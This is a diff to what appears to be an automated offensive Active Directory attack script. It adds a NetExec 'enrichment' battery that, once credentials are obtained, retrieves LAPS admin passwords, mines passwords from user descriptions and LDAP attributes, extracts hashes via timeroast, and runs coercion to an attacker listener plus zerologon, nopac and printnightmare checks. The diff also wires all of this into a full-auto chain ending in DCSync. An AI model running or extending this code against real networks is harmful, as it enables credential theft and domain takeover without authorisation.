@@ -52,7 +52,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.5.1"
+VERSION = "4.6.0"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 
@@ -5265,6 +5265,96 @@ def run_batch(targets: list[str], cfg: Config) -> int:
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# NetExec (nxc) post-cred enrichment battery
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def run_nxc_enrichment(cfg: Config):
+    """Post-credential nxc battery: vuln checks + cred mining + recon.
+
+    Each module runs independently — failures are non-fatal, just warned.
+    All output captured to work_dir/nxc-<module>.txt for offline review.
+
+    Tier A (high yield, trivial cost):
+      ldap maq                 MachineAccountQuota (RBCD viability hint)
+      ldap laps                LAPS admin password retrieval
+      ldap pre2k               Pre-2000 default-password computer accounts
+      ldap get-desc-users      User-description password mining
+      ldap get-userPassword    LDAP userPassword attribute mining
+      smb  nopac               CVE-2021-42278/42287 sAMAccountName spoof check
+
+    Tier B (specific high-impact):
+      smb  timeroast           NTP-based hash extraction (works where Kerberoast blocked)
+      smb  zerologon           CVE-2020-1472 check
+      smb  coerce_plus         Unified PetitPotam/DFSCoerce/ShadowCoerce/EFSRPC check
+      ldap dns-nonsecure       ADIDNS nonsecure-update zones
+
+    Tier C (niche):
+      smb  backup_operator     Backup Operators DRSR escalation
+      smb  printnightmare      CVE-2021-34527 check
+      ldap badsuccessor        DMSA bad successor (2024 vuln)
+    """
+    if not tool_exists("nxc"):
+        log.warning("nxc not available — skipping enrichment")
+        return
+    if not cfg.has_creds:
+        log.warning("nxc enrichment is post-auth — skipping (no creds yet)")
+        return
+    if not cfg.dc_ip:
+        log.warning("cfg.dc_ip not set — skipping nxc enrichment")
+        return
+
+    phase_header("NXC ENRICHMENT (post-auth recon + cred harvest)")
+
+    auth = _nxc_auth_args(cfg)
+    subnet = cfg.target_net or cfg.specific_target or cfg.dc_ip
+
+    # Each entry: (label, protocol, target, [extra args after -M <module>])
+    runs = [
+        # --- Tier A ---
+        ("maq",              "ldap", cfg.dc_ip, "maq",              []),
+        ("laps",             "ldap", cfg.dc_ip, "laps",             []),
+        ("pre2k",            "ldap", cfg.dc_ip, "pre2k",            []),
+        ("get-desc-users",   "ldap", cfg.dc_ip, "get-desc-users",   []),
+        ("get-userPassword", "ldap", cfg.dc_ip, "get-userPassword", []),
+        ("nopac",            "smb",  cfg.dc_ip, "nopac",            []),
+        # --- Tier B ---
+        ("timeroast",        "smb",  cfg.dc_ip, "timeroast",        []),
+        ("zerologon",        "smb",  cfg.dc_ip, "zerologon",        []),
+        ("coerce_plus",      "smb",  subnet,    "coerce_plus",
+            ["-o", f"LISTENER={cfg.attacker_ip}"] if cfg.attacker_ip else []),
+        ("dns-nonsecure",    "ldap", cfg.dc_ip, "dns-nonsecure",    []),
+        # --- Tier C ---
+        ("backup_operator",  "smb",  cfg.dc_ip, "backup_operator",  []),
+        ("printnightmare",   "smb",  subnet,    "printnightmare",   []),
+        ("badsuccessor",     "ldap", cfg.dc_ip, "badsuccessor",     []),
+    ]
+
+    for label, proto, target, module, extra in runs:
+        out_file = cfg.work_dir / f"nxc-{label}.txt"
+        cmd = ["nxc", proto, target] + auth + ["-M", module] + extra
+        log.info(f"🔍 nxc {proto} -M {label}")
+        try:
+            result = run(cmd, cfg, timeout=180, outfile=out_file)
+        except Exception as ex:
+            log.warning(f"nxc {label} crashed: {ex}")
+            continue
+        if result.returncode != 0:
+            log.warning(f"nxc {label} rc={result.returncode} — see {out_file}")
+            continue
+        # Surface any "[+]" hits (nxc convention for findings) inline
+        if out_file.exists():
+            hits = [ln for ln in out_file.read_text().splitlines() if "[+]" in ln]
+            if hits:
+                ok(f"nxc {label}: {len(hits)} hit(s)")
+                for h in hits[:5]:
+                    detail(h.strip()[:160])
+            else:
+                detail(f"nxc {label} ran clean — no findings")
+
+    ok(f"nxc enrichment done — full output in {cfg.work_dir}/nxc-*.txt")
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # Full Auto: Zero-auth → ARP/WPAD/WSUS → Crack → Exploit → DCSync
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -5375,6 +5465,9 @@ def run_full_auto(cfg: Config):
         log.error("Could not auto-detect domain/DC info after credential capture")
         log.warning(f"Re-run: {sys.argv[0]} -u '{cfg.username}' -p '{cfg.password}' -d DOMAIN --dc-ip IP")
         return
+
+    # Step 4d: nxc enrichment battery (vuln checks + cred mining + recon)
+    run_nxc_enrichment(cfg)
 
     # Step 5: Kerberoast + AS-REP Roast (immediate credential harvest)
     if not cfg.no_roast:
@@ -5717,7 +5810,7 @@ def parse_args() -> Config:
     run_opts = p.add_argument_group("Execution")
     run_opts.add_argument("--phase", default="full",
                           choices=["full", "enum", "exploit", "dcsync", "arp", "wpad", "wsus",
-                                   "pxe", "sniff", "adcs", "roast", "sccm"],
+                                   "pxe", "sniff", "adcs", "roast", "sccm", "enrich"],
                           help="Run a single phase")
     run_opts.add_argument("--dry-run", action="store_true", help="Print commands only")
     run_opts.add_argument("-v", "--verbose", action="store_true", help="Debug output")
@@ -5929,6 +6022,12 @@ def main():
                     log.error("--phase sccm requires credentials (-u/-p)")
                     sys.exit(1)
                 run_sccm_attack(cfg)
+
+            case "enrich":
+                if not cfg.has_creds:
+                    log.error("--phase enrich requires credentials (-u/-p)")
+                    sys.exit(1)
+                run_nxc_enrichment(cfg)
 
             case "full":
                 # Run new authenticated attacks before exploitation
